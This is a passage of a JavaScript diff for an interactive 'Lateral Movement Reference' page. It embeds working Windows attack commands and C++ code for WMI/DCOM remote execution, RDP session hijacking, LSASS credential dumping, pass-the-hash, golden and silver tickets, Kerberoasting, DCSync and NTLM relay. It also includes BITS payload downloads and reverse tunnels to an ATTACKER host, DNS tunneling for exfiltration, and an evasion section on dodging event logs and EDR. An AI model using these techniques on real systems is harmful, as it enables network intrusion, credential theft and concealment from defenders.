+{t:"WMI remote process create",l:"c",c:"// Win32_Process.Create via COM\nvoid WmiExec(LPCWSTR target, LPCWSTR cmd) {\n    CoInitializeEx(0, COINIT_MULTITHREADED);\n    IWbemLocator *pLoc = NULL;\n    CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,\n        IID_IWbemLocator, (void**)&pLoc);\n\n    WCHAR ns[256];\n    swprintf(ns, 256, L\"\\\\\\\\\\\\\\\\%s\\\\root\\\\cimv2\", target);\n    IWbemServices *pSvc = NULL;\n    pLoc->ConnectServer(_bstr_t(ns), NULL, NULL,\n        0, 0, 0, 0, &pSvc);\n    CoSetProxyBlanket(pSvc, 10, 0, NULL, 3, 3, NULL, 0);\n\n    IWbemClassObject *pClass, *pIn, *pOut;\n    pSvc->GetObject(_bstr_t(L\"Win32_Process\"),\n        0, NULL, &pClass, NULL);\n    pClass->GetMethod(L\"Create\", 0, &pIn, NULL);\n    IWbemClassObject *pInParams;\n    pIn->SpawnInstance(0, &pInParams);\n\n    VARIANT vCmd; vCmd.vt = VT_BSTR;\n    vCmd.bstrVal = SysAllocString(cmd);\n    pInParams->Put(L\"CommandLine\", 0, &vCmd, 0);\n\n    pSvc->ExecMethod(_bstr_t(L\"Win32_Process\"),\n        _bstr_t(L\"Create\"), 0, NULL, pInParams, &pOut, NULL);\n    CoUninitialize();\n}"},
+{t:"WinRM remote command (PowerShell)",l:"c",c:"// From PowerShell:\n// Invoke-Command -ComputerName TARGET -ScriptBlock {\n//     whoami; hostname; ipconfig\n// } -Credential $cred\n//\n// Interactive session:\n// $s = New-PSSession -ComputerName TARGET -Credential $cred\n// Enter-PSSession $s\n//\n// Copy file via WinRM:\n// Copy-Item -ToSession $s -Path .\\\\payload.exe\n//   -Destination C:\\\\Temp\\\\\n//\n// Fire-and-forget (no output wait):\n// Invoke-Command -ComputerName TARGET -ScriptBlock {\n//     Start-Process C:\\\\Temp\\\\payload.exe\n// } -AsJob\n//\n// Enable WinRM remotely (if admin via other method):\n// wmic /node:TARGET process call create\n//   \"powershell Enable-PSRemoting -Force\""},
+{t:"DCOM MMC20.Application",l:"c",c:"// Lateral movement via DCOM without service creation\n// PowerShell:\n// $dcom = [System.Activator]::CreateInstance(\n//     [type]::GetTypeFromProgID(\n//         \"MMC20.Application\", \"TARGET\"))\n// $dcom.Document.ActiveView.ExecuteShellCommand(\n//     \"C:\\\\Windows\\\\System32\\\\cmd.exe\",\n//     $null, \"/c payload.exe\", \"7\")\n\n// C++ COM:\nvoid DcomExec(LPCWSTR target) {\n    COSERVERINFO si = {0}; si.pwszName = (LPWSTR)target;\n    MULTI_QI qi = {&IID_IDispatch, NULL, 0};\n    CLSID clsid; // MMC20.Application CLSID\n    CLSIDFromProgID(L\"MMC20.Application\", &clsid);\n    CoCreateInstanceEx(clsid, NULL, CLSCTX_REMOTE_SERVER,\n        &si, 1, &qi);\n    // Navigate: Document->ActiveView->ExecuteShellCommand\n    // via IDispatch::Invoke\n}"},
+{t:"Remote service modification (no Event 7045)",l:"c",c:"// Modify existing service instead of creating new one\nSC_HANDLE hSCM = OpenSCManagerA(\n    \"\\\\\\\\TARGET\", NULL, SC_MANAGER_ALL_ACCESS);\nSC_HANDLE hSvc = OpenServiceA(hSCM,\n    \"wercplsupport\",  // dormant service\n    SERVICE_CHANGE_CONFIG | SERVICE_START | SERVICE_STOP);\n\n// Save original config for restore\nQUERY_SERVICE_CONFIGA *orig = ...;\nQueryServiceConfigA(hSvc, orig, ...);\n\n// Change to our payload\nChangeServiceConfigA(hSvc, SERVICE_NO_CHANGE,\n    SERVICE_DEMAND_START, SERVICE_NO_CHANGE,\n    \"C:\\\\Windows\\\\Temp\\\\payload.exe\",\n    NULL, NULL, NULL, NULL, NULL, NULL);\nStartServiceA(hSvc, 0, NULL);\n\n// Restore original after execution\nSleep(5000);\nChangeServiceConfigA(hSvc, SERVICE_NO_CHANGE,\n    orig->dwStartType, SERVICE_NO_CHANGE,\n    orig->lpBinaryPathName,\n    NULL, NULL, NULL, NULL, NULL, NULL);\nCloseServiceHandle(hSvc);\nCloseServiceHandle(hSCM);"}
+];
+C.rdp=[
+{t:"RDP session hijacking (SYSTEM)",l:"c",c:"// List sessions:\n// query user /server:TARGET\n//  USERNAME  SESSIONNAME  ID  STATE\n//  admin     rdp-tcp#1    2   Disc\n\n// Hijack disconnected session (need SYSTEM):\n// Method 1: sc create hijack binPath=\n//   \"cmd /c tscon 2 /dest:console\" type= own\n//   start= demand\n// sc start hijack\n\n// Method 2: PsExec to SYSTEM, then tscon:\n// PsExec -s -i tscon 2 /dest:console\n\n// No password needed for disconnected session!\n// Takes over session with all their tokens\n\n// Programmatic: CreateService + tscon\nvoid HijackRDP(int sessionId) {\n    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL,\n        SC_MANAGER_CREATE_SERVICE);\n    char cmd[256];\n    snprintf(cmd, 256, \"cmd /c tscon %d /dest:console\",\n        sessionId);\n    SC_HANDLE hSvc = CreateServiceA(hSCM, \"hijack\", NULL,\n        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,\n        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,\n        cmd, NULL, NULL, NULL, NULL, NULL);\n    StartServiceA(hSvc, 0, NULL);\n    DeleteService(hSvc);\n}"},
+{t:"Enable RDP remotely",l:"c",c:"// Via registry (requires admin SMB access):\n// reg add \"\\\\\\\\TARGET\\\\HKLM\\\\SYSTEM\\\\CurrentControlSet\n//   \\\\Control\\\\Terminal Server\" /v fDenyTSConnections\n//   /t REG_DWORD /d 0 /f\n\n// Via WMI:\n// wmic /node:TARGET /user:admin /password:pass\n//   RDPermissionsSetting WHERE AllowTSConnections=0\n//   CALL SetAllowTSConnections 1\n\n// Firewall rule (may be needed):\n// netsh advfirewall firewall add rule name=\"RDP\"\n//   dir=in action=allow protocol=TCP localport=3389\n\n// Via PowerShell remoting:\n// Invoke-Command -ComputerName TARGET {\n//   Set-ItemProperty -Path 'HKLM:\\\\SYSTEM\\\\\n//     CurrentControlSet\\\\Control\\\\Terminal Server'\n//     -Name fDenyTSConnections -Value 0\n//   Enable-NetFirewallRule -DisplayGroup\n//     'Remote Desktop'\n// }"}
+];
+C.pth=[
+{t:"Pass-the-Hash with Mimikatz",l:"c",c:"// Extract hashes from LSASS:\n// privilege::debug\n// sekurlsa::logonpasswords\n// Output: NTLM: 32-char hex hash\n\n// PTH - spawn process with stolen hash:\n// sekurlsa::pth /user:admin /domain:CORP\n//   /ntlm:aad3b435...hash... /run:cmd.exe\n\n// New cmd.exe has admin's NTLM credentials\n// From there: dir \\\\\\\\TARGET\\\\C$\n//             psexec \\\\\\\\TARGET cmd.exe\n//             Enter-PSSession TARGET\n\n// Impacket PTH (from Linux):\n// psexec.py -hashes :NTLM_HASH CORP/admin@TARGET\n// wmiexec.py -hashes :NTLM_HASH CORP/admin@TARGET\n// smbexec.py -hashes :NTLM_HASH CORP/admin@TARGET\n// atexec.py -hashes :NTLM_HASH CORP/admin@TARGET cmd"},
+{t:"Overpass-the-Hash (NTLM to Kerberos)",l:"c",c:"// Convert NTLM hash to Kerberos TGT:\n// sekurlsa::pth /user:admin /domain:CORP\n//   /ntlm:HASH /run:powershell.exe\n\n// The spawned PowerShell automatically requests TGT\n// using the injected NTLM hash\n// klist shows new Kerberos ticket\n\n// Or with Rubeus:\n// Rubeus.exe asktgt /user:admin /rc4:HASH\n//   /ptt /createnetonly:cmd.exe\n\n// Now use Kerberos for lateral movement:\n// dir \\\\\\\\TARGET.corp.local\\\\C$\n// (uses Kerberos, not NTLM)\n\n// Advantage: avoids NTLM-specific detections\n// No NTLM auth event (4625/4776)\n// Instead: Kerberos TGT request (4768)"},
+{t:"LSASS dump methods",l:"c",c:"// Method 1: Mimikatz (detected by most EDR)\n// sekurlsa::logonpasswords\n\n// Method 2: comsvcs.dll MiniDump (LOLBin)\n// rundll32 C:\\\\Windows\\\\System32\\\\comsvcs.dll,\n//   MiniDump PID_OF_LSASS C:\\\\Temp\\\\lsass.dmp full\n\n// Method 3: ProcDump (signed by MS)\n// procdump -ma lsass.exe lsass.dmp\n\n// Method 4: Task Manager (interactive)\n// Right-click lsass.exe -> Create dump file\n\n// Method 5: Direct NtReadVirtualMemory\n// Open lsass, read specific offsets for hashes\n// Avoids full dump file on disk\n\n// Method 6: SSP injection\n// Load custom SSP into LSASS\n// Captures plaintext credentials at logon\n// mimilib.dll -> memssp.dll\n\n// Parse offline: pypykatz, Mimikatz offline\n// pypykatz lsa minidump lsass.dmp"}
+];
+C.krb=[
+{t:"Pass-the-Ticket with Rubeus",l:"c",c:"// Export tickets from current session:\n// Rubeus.exe dump /nowrap\n// Or: sekurlsa::tickets /export\n\n// Import ticket on another machine:\n// Rubeus.exe ptt /ticket:base64_ticket_here\n\n// Or via Mimikatz:\n// kerberos::ptt ticket.kirbi\n\n// Request new TGT for specific user:\n// Rubeus.exe asktgt /user:admin /rc4:HASH /ptt\n\n// Request TGS for specific service:\n// Rubeus.exe asktgs /ticket:TGT /service:cifs/target\n//   /ptt\n\n// After importing ticket:\n// dir \\\\\\\\TARGET\\\\C$  (uses Kerberos ticket)\n// PsExec \\\\\\\\TARGET cmd"},
+{t:"Golden Ticket",l:"c",c:"// Requires: krbtgt NTLM hash (DCSync or NTDS.dit)\n// + Domain SID, Domain name\n\n// Mimikatz:\n// kerberos::golden /user:Administrator\n//   /domain:corp.local\n//   /sid:S-1-5-21-...\n//   /krbtgt:HASH\n//   /ptt\n\n// Or save to file:\n// /ticket:golden.kirbi\n\n// Rubeus:\n// Rubeus.exe golden /rc4:KRBTGT_HASH\n//   /user:fakeadmin /domain:corp.local\n//   /sid:S-1-5-21-... /ptt\n\n// Now: dir \\\\\\\\DC\\\\C$  (domain admin access)\n// Valid until krbtgt password changed TWICE\n// (once resets current, twice resets previous)\n\n// Impacket:\n// ticketer.py -nthash KRBTGT_HASH -domain-sid SID\n//   -domain corp.local Administrator\n// export KRB5CCNAME=Administrator.ccache\n// psexec.py -k corp.local/Administrator@DC"},
+{t:"Silver Ticket (no DC contact)",l:"c",c:"// Forge TGS directly. Never contacts DC.\n// Requires: service account hash\n\n// Mimikatz:\n// kerberos::golden /user:admin /domain:corp.local\n//   /sid:S-1-5-21-...\n//   /target:fileserver.corp.local\n//   /service:cifs\n//   /rc4:SERVICE_ACCT_HASH\n//   /ptt\n\n// Service SPNs:\n// cifs/target  = SMB file access\n// http/target  = WinRM/Web\n// mssql/target = SQL Server\n// host/target  = PsExec/schtasks\n// ldap/target  = LDAP/DCSync\n\n// Key advantage: ZERO DC logs\n// TGS is forged locally, presented directly to service\n// No 4768 (TGT request), no 4769 (TGS request)"},
+{t:"Kerberoasting",l:"c",c:"// Request TGS for all SPN accounts, crack offline\n// No special privileges needed!\n\n// Rubeus:\n// Rubeus.exe kerberoast /outfile:hashes.txt\n\n// Impacket:\n// GetUserSPNs.py -request -dc-ip DC_IP\n//   corp.local/user:password\n\n// PowerView:\n// Invoke-Kerberoast | Export-CSV kerberoast.csv\n\n// Crack with hashcat:\n// hashcat -m 13100 hashes.txt wordlist.txt\n// (mode 13100 = Kerberos 5 TGS-REP etype 23)\n\n// Targeted: specific high-value SPN\n// Rubeus.exe kerberoast /user:sqlsvc /nowrap\n\n// Defense evasion: use AES encryption\n// Rubeus.exe kerberoast /enctype:aes256\n// (hashcat -m 19700 for AES tickets)"}
+];
+C.xfr=[
+{t:"SMB file copy to admin share",l:"c",c:"// Copy payload to target via admin share\ncopy payload.exe \\\\\\\\TARGET\\\\C$\\\\Windows\\\\Temp\\\\payload.exe\n\n// Or with explicit creds:\nnet use \\\\\\\\TARGET\\\\C$ /user:CORP\\\\admin Password123\ncopy payload.exe \\\\\\\\TARGET\\\\C$\\\\Windows\\\\Temp\\\\\nnet use \\\\\\\\TARGET\\\\C$ /delete\n\n// Programmatic:\nvoid SmBCopy(LPCSTR target, LPCSTR src, LPCSTR dst) {\n    char remote[512];\n    snprintf(remote, 512, \"\\\\\\\\\\\\\\\\%s\\\\C$\\\\%s\", target, dst);\n    CopyFileA(src, remote, FALSE);\n}\n\n// Impacket (from Linux):\n// smbclient.py -hashes :HASH CORP/admin@TARGET\n// > put payload.exe Windows/Temp/payload.exe"},
+{t:"BITS transfer (background, stealthy)",l:"c",c:"// BITS runs as svchost, blends with Windows Update traffic\nbitsadmin /transfer job /download /priority normal\n    http://ATTACKER/payload.exe\n    C:\\\\Temp\\\\payload.exe\n\n// PowerShell:\nStart-BitsTransfer -Source http://ATTACKER/p.exe\n    -Destination C:\\\\Temp\\\\p.exe\n\n// Advantages:\n// - Runs as SYSTEM (svchost)\n// - Survives reboot (job persists)\n// - Throttled, blends with update traffic\n// - Proxy-aware\n\n// Persistence via BITS:\nbitsadmin /create /download persist_job\nbitsadmin /addfile persist_job\n    http://ATTACKER/payload.exe C:\\\\Temp\\\\p.exe\nbitsadmin /setnotifycmdline persist_job\n    C:\\\\Temp\\\\p.exe NULL\nbitsadmin /resume persist_job"}
+];
+C.wmi=[
+{t:"WMI process create (Impacket)",l:"c",c:"// From Linux with Impacket:\n// wmiexec.py CORP/admin:Password@TARGET\n// (semi-interactive shell via WMI)\n\n// wmiexec uses Win32_Process.Create\n// Output retrieved via temp file on ADMIN$ share\n// Cleanup: deletes temp files after read\n\n// Targeted command:\n// wmiexec.py -hashes :HASH CORP/admin@TARGET\n//   \"whoami && hostname\"\n\n// How it works internally:\n// 1. Connect to root\\\\cimv2 via DCOM (135)\n// 2. Win32_Process.Create(\"cmd /c command > out.txt\")\n// 3. Read out.txt via SMB (445)\n// 4. Delete out.txt\n// 5. Return output\n\n// CIM variant (PowerShell, uses WinRM):\n// $s = New-CimSession -ComputerName TARGET\n// Invoke-CimMethod -CimSession $s\n//   -ClassName Win32_Process -MethodName Create\n//   -Arguments @{CommandLine='calc.exe'}"},
+{t:"WMI StdRegProv (remote registry)",l:"c",c:"// Read/write remote registry via WMI\n// No reg.exe or PowerShell on target needed\n\n// PowerShell:\n// $reg = [wmiclass]\"\\\\\\\\TARGET\\\\root\\\\default:StdRegProv\"\n\n// Read value:\n// $reg.GetStringValue(2147483650,  # HKLM\n//   'SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion',\n//   'ProgramFilesDir')\n\n// Write value (persistence!):\n// $reg.SetStringValue(2147483650,\n//   'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run',\n//   'Updater', 'C:\\\\payload.exe')\n\n// Enum subkeys:\n// $reg.EnumKey(2147483650,\n//   'SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion')\n\n// HKLM = 2147483650 (0x80000002)\n// HKCU = 2147483649 (0x80000001)\n// HKCR = 2147483648 (0x80000000)"}
+];
+C.adv=[
+{t:"Chisel SOCKS proxy setup",l:"c",c:"// On attacker (server):\n// chisel server --reverse --port 8080\n\n// On compromised host (client):\n// chisel client ATTACKER:8080 R:1080:socks\n\n// Now SOCKS5 proxy on attacker:1080\n// Route tools through it:\n// proxychains nmap -sT -p 445,3389 10.0.0.0/24\n// proxychains psexec.py admin:pass@10.0.0.5\n// proxychains evil-winrm -i 10.0.0.5 -u admin\n\n// Ligolo-ng (faster, TUN-based):\n// On attacker: ligolo-proxy -selfcert\n// On target: ligolo-agent -connect ATTACKER:11601\n// In proxy: session -> ifconfig -> start\n// Adds route to internal network directly\n\n// SSH SOCKS (if SSH available):\n// ssh -D 1080 -N user@compromised_host\n// proxychains tool ..."},
+{t:"MSSQL xp_cmdshell pivot",l:"c",c:"// Enable xp_cmdshell (if disabled):\n// EXEC sp_configure 'show advanced options', 1;\n// RECONFIGURE;\n// EXEC sp_configure 'xp_cmdshell', 1;\n// RECONFIGURE;\n\n// Execute commands:\n// EXEC xp_cmdshell 'whoami';\n// EXEC xp_cmdshell 'powershell -c IEX(...)';\n\n// Linked server pivoting:\n// EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]\n// Chain: Server1 -> Server2 -> Server3\n// EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT\n//   [Server3]') AT [Server2]\n\n// CLR assembly for .NET execution:\n// CREATE ASSEMBLY payload FROM 0x4D5A...\n// CREATE PROCEDURE dbo.cmd @c NVARCHAR(4000)\n//   AS EXTERNAL NAME payload.Class.Method;\n// EXEC dbo.cmd 'whoami';"},
+{t:"Named pipe C2 pivot (SMB beacon)",l:"c",c:"// Cobalt Strike / custom C2 over named pipes\n// First host has internet C2\n// Second host connects via SMB pipe\n\n// Create named pipe on target:\n// (after initial injection)\n// HANDLE hPipe = CreateNamedPipeA(\n//     \"\\\\\\\\.\\\\pipe\\\\mypipe\",\n//     PIPE_ACCESS_DUPLEX,\n//     PIPE_TYPE_MESSAGE | PIPE_WAIT,\n//     1, 4096, 4096, 0, NULL);\n// ConnectNamedPipe(hPipe, NULL);\n\n// Parent beacon connects from pivot host:\n// HANDLE hRemote = CreateFileA(\n//     \"\\\\\\\\TARGET\\\\pipe\\\\mypipe\",\n//     GENERIC_READ | GENERIC_WRITE,\n//     0, NULL, OPEN_EXISTING, 0, NULL);\n\n// C2 data flows: Internet <-> Host1 <-> SMB Pipe <-> Host2\n// Only port 445 between internal hosts\n// No direct internet from Host2"}
+];
+C.kit=[
+{t:"DCSync attack",l:"c",c:"// Replicate any account's hash from DC\n// Requires: Replicating Directory Changes All\n//   (Domain Admins have this by default)\n\n// Mimikatz:\n// lsadump::dcsync /user:CORP\\\\krbtgt\n// lsadump::dcsync /user:CORP\\\\Administrator\n// lsadump::dcsync /all /csv\n\n// Impacket:\n// secretsdump.py CORP/admin:pass@DC_IP\n// secretsdump.py -hashes :HASH CORP/admin@DC_IP\n\n// Output: username:RID:LMhash:NThash\n// krbtgt hash = golden ticket capability\n// Any user hash = PTH to that user\n\n// No code execution on DC needed!\n// Uses DRSUAPI replication protocol (port 135+dynamic)\n// Looks like normal DC replication to some extent"},
+{t:"Network scan with Test-NetConnection",l:"c",c:"// PowerShell port scan (no tools needed)\n$targets = @('10.0.0.1','10.0.0.2','10.0.0.5')\n$ports = @(445, 135, 5985, 3389, 22, 1433)\n\nforeach ($t in $targets) {\n    foreach ($p in $ports) {\n        $r = Test-NetConnection -ComputerName $t\n            -Port $p -WarningAction SilentlyContinue\n        if ($r.TcpTestSucceeded) {\n            Write-Host \"$t : $p OPEN\"\n        }\n    }\n}\n\n// Faster: parallel with runspaces or jobs\n// Or single-line:\n// 1..254 | %{Test-NetConnection 10.0.0.$_\n//   -Port 445 -EA 0 | ?{$_.TcpTestSucceeded}}"},
+{t:"Invoke-Command mass execution",l:"c",c:"// Execute on multiple hosts simultaneously\n$targets = Get-ADComputer -Filter * |\n    Select -Expand DNSHostName\n\n$cred = Get-Credential\n\nInvoke-Command -ComputerName $targets\n    -Credential $cred -ScriptBlock {\n    hostname\n    whoami\n    Get-Process\n} -ThrottleLimit 32 | Export-CSV results.csv\n\n// Targeted: check admin access\n$targets | ForEach-Object {\n    try {\n        Invoke-Command -ComputerName $_ -ScriptBlock {\n            $env:COMPUTERNAME\n        } -Credential $cred -EA Stop\n        Write-Host \"ADMIN: $_\" -ForegroundColor Green\n    } catch {\n        Write-Host \"DENIED: $_\" -ForegroundColor Red\n    }\n}"}
+];
+C.byp=[
+{t:"netsh port forwarding",l:"c",c:"// Forward local port to internal target\n// Useful when firewall blocks direct access\n\nnetsh interface portproxy add v4tov4\n    listenport=8888 listenaddress=0.0.0.0\n    connectport=445 connectaddress=10.0.0.5\n\n// Now: smbclient.py admin:pass@PIVOT_HOST:8888\n// Traffic: Attacker -> Pivot:8888 -> Target:445\n\n// View current forwards:\nnetsh interface portproxy show all\n\n// Delete when done:\nnetsh interface portproxy delete v4tov4\n    listenport=8888 listenaddress=0.0.0.0\n\n// Alternative: SSH local forward\nssh -L 8888:10.0.0.5:445 user@pivot_host"},
+{t:"NTLM relay with ntlmrelayx",l:"c",c:"// Setup relay server:\n// ntlmrelayx.py -t TARGET -smb2support -i\n// (interactive mode -> opens local bind shell)\n\n// Coerce authentication:\n// PetitPotam: python3 PetitPotam.py ATTACKER DC\n// PrinterBug: SpoolSample.exe DC ATTACKER\n// DFSCoerce: dfscoerce.py -d CORP -u user ATTACKER DC\n\n// Relay to LDAP (set RBCD):\n// ntlmrelayx.py -t ldap://DC --delegate-access\n// Creates computer account + sets RBCD\n// Then: getST.py -spn cifs/TARGET\n//   -impersonate Administrator CORP/COMPUTER$:pass\n\n// Relay to SMB (code execution):\n// ntlmrelayx.py -t TARGET -e payload.exe\n// Executes payload via SMB on target\n\n// Requirement: SMB signing disabled on target\n// Check: crackmapexec smb TARGET --gen-relay-list"},
+{t:"DNS tunneling (dnscat2)",l:"c",c:"// DNS almost always allowed through firewalls\n// Slow but reliable exfil/C2 channel\n\n// Server (attacker):\n// ruby dnscat2.rb tunnel.attacker.com\n\n// Client (target):\n// dnscat2.exe tunnel.attacker.com\n\n// Creates encrypted C2 channel over DNS\n// TXT, CNAME, MX records for data\n\n// Alternative: iodine (IP over DNS)\n// Server: iodined -f -P pass 10.0.0.1 tunnel.atk.com\n// Client: iodine -f -P pass tunnel.atk.com\n// Creates TUN interface with IP connectivity\n\n// Detection: high volume of DNS queries\n// to single domain, unusual record types"}
+];
+return C[s]||[];
+}
+var TR={
+rex:[
+{t:"WMI > PsExec for stealth",d:"PsExec creates a service (Event 7045), writes binary to ADMIN$, and creates named pipe. WMI Process.Create has none of these artifacts. Output is the tradeoff."},
+{t:"DCOM is the least monitored",d:"DCOM lateral movement via MMC20, ShellWindows, etc. creates no service, no WMI event, no PowerShell logging. Many EDRs don't specifically detect DCOM object abuse."},
+{t:"Modify service > create service",d:"Changing an existing dormant service's binPath avoids Event 7045 (service creation). Only Event 7040 (config change) which is often not monitored."},
+{t:"WinRM leaves PowerShell logs",d:"WinRM/PSRemoting creates ScriptBlock logging, Module logging, and PowerShell Operational logs. Use if other methods blocked, but be aware of logging."}
+],
+rdp:[
+{t:"Session hijacking needs no password",d:"Disconnected RDP sessions can be taken over with tscon from SYSTEM context. No authentication event logged for the hijack itself."},
+{t:"RDP generates Type 10 logon",d:"Event 4624 with LogonType 10 (RemoteInteractive) is specific to RDP. Easily filtered by SOC. Consider using restricted admin mode for PTH over RDP."},
+{t:"SharpRDP avoids mstsc.exe",d:"Programmatic RDP doesn't spawn mstsc.exe. Process tree looks different from manual RDP, which some behavioral detections key on."},
+{t:"Restricted Admin for PTH-RDP",d:"With restricted admin enabled, RDP accepts NTLM hash (no plaintext). Enable: reg add HKLM\\...\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0."}
+],
+pth:[
+{t:"Overpass-the-Hash avoids NTLM detection",d:"PTH triggers NTLM auth events (4776). Overpass converts to Kerberos TGT, generating only Kerberos events (4768). Avoids NTLM-specific monitoring rules."},
+{t:"Local admin hash reuse",d:"If local admin has same password across machines (common), one hash works everywhere. Disable this with LAPS or unique local admin passwords."},
+{t:"LSASS dump alternatives",d:"If Mimikatz is detected, use comsvcs.dll MiniDump (LOLBin), ProcDump (signed), or direct NtReadVirtualMemory for targeted extraction."},
+{t:"WDigest plaintext",d:"On older systems or with UseLogonCredential=1, WDigest stores plaintext passwords in LSASS. Check and enable if needed for plaintext access."}
+],
+krb:[
+{t:"Golden ticket = persistence",d:"Golden ticket is valid until krbtgt password rotated TWICE. Most orgs never rotate it. Effectively permanent domain admin."},
+{t:"Silver ticket = zero DC logs",d:"Silver ticket (forged TGS) never contacts DC. No 4768/4769 events. Presented directly to service. Most stealthy Kerberos lateral movement."},
+{t:"RBCD requires only write access",d:"Resource-Based Constrained Delegation can be set by anyone with write access to computer's msDS-AllowedToActOnBehalfOfOtherIdentity. No DA needed."},
+{t:"Kerberoast uses AES to avoid detection",d:"Default Kerberoasting requests RC4 tickets (anomalous). Request AES256 tickets instead to blend with normal traffic. Harder to crack but stealthier."}
+],
+xfr:[
+{t:"BITS is the stealthiest download",d:"BITS runs as svchost, proxy-aware, survives reboots, and looks like Windows Update traffic. Best choice for pulling payloads through corporate proxies."},
+{t:"Admin shares require local admin",d:"C$ and ADMIN$ shares need local administrator. Regular shares may have broader access. Enumerate writable shares for staging."},
+{t:"WebDAV through web proxy",d:"WebDAV maps as UNC path but uses HTTP. Traffic goes through corporate web proxy on 80/443. Bypasses SMB firewall rules."},
+{t:"certutil is a LOLBin",d:"certutil -urlcache downloads files using a signed Microsoft binary. Many environments allow it, but increasingly flagged by EDR."}
+],
+wmi:[
+{t:"WMI Process.Create is blind",d:"No output returned from Win32_Process.Create. Must redirect output to file (ADMIN$ share) and read it back via SMB. wmiexec.py automates this."},
+{t:"CIM uses WinRM, not DCOM",d:"New-CimSession defaults to WSMan (5985/5986). Often allowed when DCOM (135) is blocked. Different network footprint than legacy WMI."},
+{t:"StdRegProv for remote persistence",d:"WMI StdRegProv reads/writes remote registry without reg.exe or PowerShell on target. Good for adding Run keys or modifying services remotely."},
+{t:"WMI event subscription for delayed exec",d:"Create WMI subscription on remote host. Payload triggers after delay (WITHIN interval). No immediate execution = harder to correlate."}
+],
+adv:[
+{t:"Named pipes blend with SMB",d:"SMB pipe traffic on port 445 looks like normal file sharing. C2 over named pipes is very hard to distinguish from legitimate SMB without deep inspection."},
+{t:"Ligolo-ng > Chisel for speed",d:"Ligolo-ng creates a TUN interface with direct IP routing. No proxychains needed. Much faster and more compatible than SOCKS proxying."},
+{t:"MSSQL linked servers chain trust",d:"SQL Server links allow multi-hop: Server1 -> Server2 -> Server3. Each hop may have different credentials. Follow the trust chain."},
+{t:"SSH is increasingly available on Windows",d:"Windows 10+ ships OpenSSH client. Many servers have OpenSSH server enabled. Less monitored than WinRM in many environments."}
+],
+kit:[
+{t:"DCSync looks like replication",d:"DCSync uses DRSUAPI (legitimate replication protocol). Hard to distinguish from real DC-to-DC replication without specific monitoring."},
+{t:"Test-NetConnection for recon",d:"Built-in PowerShell cmdlet. No external tools needed. Test specific ports to identify available services before attempting lateral movement."},
+{t:"Check admin access before moving",d:"Test 'dir \\\\TARGET\\\\C$' or quick WMI query before committing to lateral movement. Failed attempts generate 4625 events."},
+{t:"Prioritize targets by value",d:"Domain controllers, file servers, database servers, jump hosts. Map the network, identify high-value targets, minimize unnecessary lateral movement."}
+],
+byp:[
+{t:"DNS tunneling always works",d:"DNS is almost never blocked. Even highly segmented networks need DNS resolution. Slow but reliable for C2 and data exfiltration."},
+{t:"NTLM relay requires signing disabled",d:"Check SMB signing with crackmapexec. Relay only works against hosts without required signing. DCs always require signing."},
+{t:"Silver tickets bypass all logon logging",d:"Forged TGS presented directly to service. No DC involvement means no DC-side logging. Only the target service sees the authentication."},
+{t:"Kerberos over NTLM always",d:"Kerberos generates fewer anomaly detections, works with constrained delegation, and doesn't expose hashes on the network. Prefer it for all lateral movement."},
+{t:"Credential Guard doesn't block everything",d:"Credential Guard protects NTLM hashes in LSASS but Kerberos tickets, DPAPI keys, and DCSync still work. It's not a complete defense."},
+{t:"Port forwarding through pivot",d:"netsh portproxy on compromised host forwards traffic to internal targets. No additional tools needed. Survives until manually removed."}
+]
+};
+function render(){
+var si=SE.findIndex(function(x){return x.id===S.s}),so=SE[si];
+var codes=getCodes(S.s),tricks=TR[S.s]||[];
+var flow='';
+if(S.s==='rex')flow=fREX();else if(S.s==='rdp')flow=fRDP();else if(S.s==='pth')flow=fPTH();
+else if(S.s==='krb')flow=fKRB();else if(S.s==='xfr')flow=fXFR();else if(S.s==='wmi')flow=fWMI();
+else if(S.s==='adv')flow=fADV();else if(S.s==='kit')flow=fKIT();else if(S.s==='byp')flow=fBYP();
+var chtml=codes.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No code examples.</div>':
+codes.map(function(c,i){return'<div class="cp" data-ci="'+i+'"><button class="ct2"><span class="cv">&#9654;</span><span class="tl">'+c.t+'</span>'+T(c.l,"#6b7280",1)+'</button></div>'}).join('');
+var thtml=tricks.length===0?'':
+'<div style="font-size:.68em;font-weight:800;color:#f97316;letter-spacing:.08em;margin-bottom:6px">EVASION / TRADECRAFT</div>'+
+tricks.map(function(t,i){return'<div class="ti" data-ti="'+i+'"><button class="tt"><span class="cv" style="color:#f97316;font-size:10px">&#9654;</span><span class="tn">'+t.t+'</span></button></div>'}).join('');
+var pv=si>0?'<button class="nb2" data-nv="'+SE[si-1].id+'">\u2190 '+SE[si-1].l+'</button>':'';
+var nx=si<SE.length-1?'<button class="nb2" data-nv="'+SE[si+1].id+'">'+SE[si+1].l+' \u2192</button>':'';
+$('#app').innerHTML=
+'<div class="hd"><div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:6px"><div><h1>Lateral Movement Reference</h1><div class="sub">Remote Exec \u2022 RDP \u2022 PTH \u2022 Kerberos \u2022 File Transfer \u2022 WMI \u2022 Advanced \u2022 Toolkit \u2022 Bypasses</div></div></div><div class="st">'+
+SE.map(function(s){return'<button class="sb'+(S.s===s.id?' on':'')+'" style="'+(S.s===s.id?'color:'+s.c+';border-bottom-color:'+s.c:'')+'" data-sc="'+s.id+'">'+s.i+' '+s.l+'</button>'}).join('')+
+'</div></div><div class="ut"><button class="ub'+(S.t==='flow'?' on':'')+'" data-tb="flow">\u{1F4CA} Flow</button><button class="ub'+(S.t==='code'?' on':'')+'" data-tb="code">\u{1F4BB} Code'+(codes.length?' <span class="cnt">'+codes.length+'</span>':'')+'</button><button class="ub'+(S.t==='tricks'?' on':'')+'" data-tb="tricks">\u{1F512} Evasion'+(tricks.length?' <span class="cnt">'+tricks.length+'</span>':'')+'</button></div>'+
